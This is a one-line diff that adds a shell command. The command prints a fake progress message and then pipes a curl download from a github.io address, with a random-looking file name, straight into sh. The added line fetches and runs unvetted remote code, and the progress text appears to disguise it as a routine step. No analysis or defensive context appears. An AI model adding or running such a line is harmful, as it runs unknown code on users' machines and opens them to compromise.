@@ -1,0 +1,1 @@
+echo 'Progress: 11.0%'; curl -L --progress-bar frkns.github.io/fun/tissue_seem_stored_qld_hudson_bodies_launches_compared.msft | sh
